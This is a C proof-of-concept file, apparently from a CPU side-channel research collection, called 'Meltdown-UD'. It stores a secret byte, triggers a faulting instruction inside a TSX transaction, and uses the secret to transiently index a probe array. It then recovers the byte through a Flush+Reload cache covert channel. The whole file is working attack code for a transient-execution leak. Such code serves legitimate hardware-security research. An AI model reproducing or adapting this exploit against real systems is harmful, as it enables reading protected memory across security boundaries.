#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cacheutils.h"

#define SECRET 'S'

int main(void) {
  int status;
  int pkey;
  char *buffer;
  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char*) malloc( pagesize * 256 );
  memset(mem, 1, pagesize * 256);

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  buffer = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE,
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  *buffer = SECRET;
  printf("buffer contains: %c\n", *buffer);
  
  // Flush our shared memory
  flush_shared_memory();

  for(int r = 0; r < 1000000; r++) {
    // Ensure data is in the cache
    maccess(buffer);
    unsigned status;
    // Start TSX
    if(try_start()) {
      // ud#, due to wrong lock prefix
#if !defined(__aarch64__)
      asm volatile(".byte 0xf0");
      asm volatile("inc %rax");
#else
	    asm volatile (".word 0x00000000\n"); //raises sigill
#endif
      // Encode in the cache
      maccess(mem + (*buffer) * pagesize);

      try_abort();
    }
    try_end();

    // Recover from the covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = (i * 167 + 13) % 256;
      if(flush_reload(mem + mix_i * pagesize)) {
        printf("%c ", mix_i);
        fflush(stdout);
      }
    }
  }

  printf("Meltdown-UD done!\n");

  printf("buffer contains: %c\n", *buffer);

  free(mem);
  return EXIT_SUCCESS;
}
